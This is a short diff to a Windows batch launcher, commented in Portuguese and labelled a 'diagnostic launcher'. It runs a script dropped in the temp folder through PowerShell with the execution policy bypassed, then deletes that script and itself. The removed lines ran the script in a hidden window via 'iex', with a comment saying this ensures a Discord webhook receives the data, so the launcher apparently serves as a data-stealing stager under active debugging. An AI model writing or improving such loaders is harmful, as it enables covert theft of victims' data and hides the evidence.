@@ -1,7 +1,15 @@
 @echo off
-set "f=%TEMP%\f.log"
+echo [INFO] A iniciar launcher de diagnóstico...
+set "f=%TEMP%\f.ps1"
+:: Mudamos de f.log para f.ps1 para permitir execução direta
+if exist "%TEMP%\f.log" rename "%TEMP%\f.log" "f.ps1"
+
 timeout /t 2 /nobreak >nul
-:: Execução forçando TLS 1.2 para garantir que o Webhook do Discord recebe os dados
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $s=Get-Content '%f%' -Raw; iex $s"
-del "%f%"
+:: Execução direta com o operador '&' em vez de IEX
+powershell -NoProfile -ExecutionPolicy Bypass -Command "& '%TEMP%\f.ps1'"
+
+echo.
+echo [DEBUG] Fim do script PowerShell. Pressione qualquer tecla para limpar.
+pause
+del "%TEMP%\f.ps1"
 del "%~f0"
